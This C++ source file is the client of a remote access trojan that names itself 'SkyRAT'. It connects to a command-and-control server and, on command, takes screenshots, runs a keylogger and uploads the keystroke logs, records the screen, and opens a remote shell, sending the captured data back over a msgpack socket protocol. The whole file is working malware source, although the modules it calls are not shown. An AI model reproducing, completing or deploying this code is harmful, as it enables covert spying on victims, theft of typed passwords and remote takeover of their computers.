//g++ client.cpp .\modules\module.cpp .\modules\ss_module.cpp .\modules\keylogger\keylogger_module.cpp .\modules\screen_recording_module.cpp .\modules\remote_shell_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32

// TO DO
// move functions to the modules directory and minimize client.cpp
// implement webcam and remote shell modules
// 

#include <iostream>
#include <thread>
#include <chrono>
#include <cstring>
#include <string>
#include <atomic>
#include <csignal>
#include <fstream>
#include <vector>
#include <sstream>

// module headers
#include <memory>
#include "modules/ss_module.h"
#include "modules/keylogger/keylogger_module.h"
#include "modules/screen_recording_module.h"
#include "modules/remote_shell_module.h"

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Gdiplus.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR   -1
typedef int SOCKET;
#endif

// Configuration of server connection
const char* SERVER_IP     = "127.0.0.1"; // Server IP address
const uint16_t SERVER_PORT = 4545;        // Server port
const int    RECV_BUF_SIZE = 1024;        // Buffer size for receiving data

// Global atomic flag for graceful shutdown
std::atomic<bool> g_running{true};

//Function declarations
//Bu ikisinin burda olması optimal değil aynı fonksiyonlar hem module hem burda var ama üzerine şuan çok düşünmedim daha iyi yazılabilir.
bool send_message(SOCKET sock, const std::string& msg);
std::vector<char> create_message(const std::string& content);

//Module declarations
Keylogger_Module keylogger;
SS_Module screenshot;
ScreenRecording_Module screenRecording;
RemoteShell_Module remoteShell;


// Signal handler to catch termination signals (like Ctrl+C)
void signal_handler(int signal) {
    std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
    g_running = false; // Set the flag to false to stop main loop
}

bool send_message(SOCKET sock, const std::string& msg){
    std::vector<char> formatted_msg = create_message(msg);
    return send(sock, formatted_msg.data(), static_cast<int>(formatted_msg.size()), 0) != SOCKET_ERROR;
}

std::vector<char> create_message(const std::string& content) {
    // Create msgpack format: [{"content": "message"}]
    // This is a simplified approach that works with the Python server
    
    std::vector<char> result;
    
    // Array with 1 element (fixarray format: 0x91)
    result.push_back(0x91);
    
    // Map with 1 key-value pair (fixmap format: 0x81)  
    result.push_back(0x81);
    
    // Key: "content" (7 chars, fixstr: 0xa7)
    result.push_back(0xa7);
    result.insert(result.end(), {'c','o','n','t','e','n','t'});
    
    // Value: message content
    if (content.length() < 32) {
        // fixstr format (0xa0 + length)
        result.push_back(0xa0 + static_cast<char>(content.length()));
        result.insert(result.end(), content.begin(), content.end());
    } else if (content.length() < 256) {
        // str8 format  
        result.push_back(0xd9);
        result.push_back(static_cast<char>(content.length()));
        result.insert(result.end(), content.begin(), content.end());
    } else {
        // str16 format
        result.push_back(0xda);
        result.push_back(static_cast<char>((content.length() >> 8) & 0xFF));
        result.push_back(static_cast<char>(content.length() & 0xFF));
        result.insert(result.end(), content.begin(), content.end());
    }
    
    return result;
}


// Initialize socket subsystem
bool init_sockets() {
#ifdef _WIN32
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2,2), &wsaData) == 0;
#else
    return true;
#endif
}

// Cleanup socket subsystem
void cleanup_sockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Create and connect socket to server
SOCKET connect_to_server(const char* ip, uint16_t port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error: Could not create socket." << std::endl;
        return INVALID_SOCKET;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error: Connection failed." << std::endl;
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        return INVALID_SOCKET;
    }

    return sock; // Return connected socket
}

// Receive message from socket
int receive_reply(SOCKET sock, char* buffer, int bufSize) {
    int bytes = recv(sock, buffer, bufSize - 1, 0);
    if (bytes > 0) buffer[bytes] = '\0'; // Null-terminate the received data
    return bytes;
}

// Handle commands received from server
void handle_command(const std::string& command, SOCKET sock) {
    std::cout << "[Command] Received: " << command << std::endl;

    if (command == "TAKE_SCREENSHOT") {
        std::cout << "[Action] Taking screenshot..." << std::endl;

        try {
            // Initialize GDI+
            ULONG_PTR gdiplusToken;
            Gdiplus::GdiplusStartupInput gdiStartupInput;
            Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL);
            
            if (status != Gdiplus::Ok) {
                std::cerr << "[Error] Failed to initialize GDI+. Status: " << status << std::endl;
                return;
            }

            const char* filename = "screenshot.png"; // Save filename
            TakeScreenshot(filename); // Capture screenshot
            
            std::cout << "[Action] Screenshot taken, file saved as: " << filename << std::endl;
            
            if (screenshot.sendFileViaMsgPack(sock, filename)) {
                std::cout << "[Success] Screenshot sent to server" << std::endl;
            } else {
                std::cout << "[Warning] Screenshot saved locally but failed to send" << std::endl;
            }

            Gdiplus::GdiplusShutdown(gdiplusToken); // Shutdown GDI+
        } catch (const std::exception& e) {
            std::cerr << "[Error] Exception in screenshot handling: " << e.what() << std::endl;
        }
    }
    else if (command == "START_KEYLOGGER") {
        std::cout << "[Action] Starting keylogger module..." << std::endl;
        
        try{
            keylogger.run();
        }
        catch(const std::exception& e){
            std::cerr << "[Error] Exception in keylogger handling: " << e.what() << std::endl;
        }

    }
    else if (command == "STOP_KEYLOGGER") {
        std::cout << "[Action] Stopping keylogger..." << std::endl;
        
        keylogger.stopKeylogger();
        const char* keylogFileName = keylogger.getKeylogFileName();
        std::cout << "[Action] Keylogger stopped. File saved as: " << keylogFileName << std::endl;

        if (keylogger.sendFileViaMsgPack(sock, keylogFileName)) {
            std::cout << "[Success] Log file sent to server" << std::endl;
        } else {
            std::cout << "[Warning] Log file saved locally but failed to send" << std::endl;
        }
    }
    else if (command == "START_SCREEN_RECORDING") {
        std::cout << "[Action] Starting screen recording..." << std::endl;
        
        try {
            if (screenRecording.startRecording(sock, 10, 30)) { // 10 seconds, 30 FPS
                std::cout << "[Success] Screen recording started" << std::endl;
            } else {
                std::cout << "[Warning] Failed to start screen recording" << std::endl;
            }
        } catch (const std::exception& e) {
            std::cerr << "[Error] Exception in screen recording: " << e.what() << std::endl;
        }
    }
    else if (command == "STOP_SCREEN_RECORDING") {
        std::cout << "[Action] Stopping screen recording..." << std::endl;
        
        try {
            screenRecording.stopRecording();
            std::cout << "[Success] Screen recording stopped" << std::endl;
        } catch (const std::exception& e) {
            std::cerr << "[Error] Exception in stopping screen recording: " << e.what() << std::endl;
        }
    }
    else if (command == "START_REMOTE_SHELL") {
        std::cout << "[Action] Starting remote shell..." << std::endl;
        
        try {
            if (remoteShell.startRemoteShell(sock)) {
                std::cout << "[Success] Remote shell started" << std::endl;
            } else {
                std::cout << "[Warning] Failed to start remote shell" << std::endl;
            }
        } catch (const std::exception& e) {
            std::cerr << "[Error] Exception in remote shell: " << e.what() << std::endl;
        }
    }
    else if (command == "STOP_REMOTE_SHELL") {
        std::cout << "[Action] Stopping remote shell..." << std::endl;
        
        try {
            remoteShell.stopRemoteShell();
            std::cout << "[Success] Remote shell stopped" << std::endl;
        } catch (const std::exception& e) {
            std::cerr << "[Error] Exception in stopping remote shell: " << e.what() << std::endl;
        }
    }
    else {
        std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
    }
}

// Connection handler in a separate thread
void handle_connection() {
    if (!init_sockets()) {
        std::cerr << "Error: Socket subsystem init failed." << std::endl;
        return;
    }

    SOCKET sock = connect_to_server(SERVER_IP, SERVER_PORT);
    if (sock == INVALID_SOCKET) {
        cleanup_sockets();
        return;
    }
    std::cout << "[Thread] Connected to server on " << SERVER_IP << ":" << SERVER_PORT << std::endl;

    // Send initial greeting message
    std::string greeting = "Hello from threaded client!";
    if (!send_message(sock, greeting)) {
        std::cerr << "Error: Send failed." << std::endl;
        goto cleanup;
    }
    std::cout << "[Thread] Sent greeting to server" << std::endl;

    // Listening for server commands
    char buffer[RECV_BUF_SIZE];
    std::cout << "[Thread] Starting command listening loop..." << std::endl;
    
    while (g_running) {
        std::cout << "[Thread] Waiting for command..." << std::endl;
        int received = receive_reply(sock, buffer, RECV_BUF_SIZE);
        
        if (received > 0) {
            std::cout << "[Thread] Received " << received << " bytes" << std::endl;
            std::string command(buffer);
            handle_command(command, sock);

            // Send acknowledgment back
            std::string ack = "ACK: " + command;
            if (!send_message(sock, ack)) {
                std::cerr << "Error: Failed to send acknowledgment." << std::endl;
                break;
            }
            std::cout << "[Thread] Sent acknowledgment" << std::endl;
        } else if (received == 0) {
            std::cout << "[Thread] Server closed the connection." << std::endl;
            break;
        } else {
            std::cerr << "Error: Receive failed. Error code: " << received << std::endl;
#ifdef _WIN32
            std::cerr << "WSA Error: " << WSAGetLastError() << std::endl;
#endif
            break;
        }
    }

cleanup:
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
    cleanup_sockets();
    std::cout << "[Thread] Connection closed." << std::endl;
}

int main() {
    std::cout << "Starting SkyRAT threaded client..." << std::endl;

    // Register signal handler
    std::signal(SIGINT, signal_handler);

    // Launch thread for handling connection
    std::thread clientThread(handle_connection);

    // Wait for thread to finish (blocks until connection thread exits)
    clientThread.join();

    std::cout << "Client thread finished. Exiting." << std::endl;
    return 0;
}
